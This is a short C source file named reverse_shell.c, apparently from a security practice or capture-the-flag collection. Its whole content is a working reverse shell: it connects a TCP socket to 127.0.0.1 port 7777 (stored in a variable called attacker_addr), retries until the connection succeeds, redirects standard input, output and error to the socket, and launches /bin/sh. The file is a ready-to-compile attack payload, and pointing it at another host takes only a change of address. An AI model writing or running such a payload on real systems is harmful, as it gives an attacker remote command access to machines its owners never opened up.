/*************************************************************
 * File Name: reverse_shell.c
 * 
 * Created on: 2019-10-23 01:54:48
 * Author: raycp
 * 
 * Last Modified: 2019-10-23 05:05:08
 * Description: reverse shell to localhost:7777
************************************************************/

#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include <fcntl.h> 
#include <unistd.h>

char server_ip[]="127.0.0.1";
uint32_t server_port=7777;

int main() 
{
    //socket initialize
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in attacker_addr = {0};
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(server_port);
    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);

    //connect to the server
   while(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0);

   //dup the socket to stdin, stdout and stderr
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    //execute /bin/sh to get a shell
    system("/bin/sh");
}
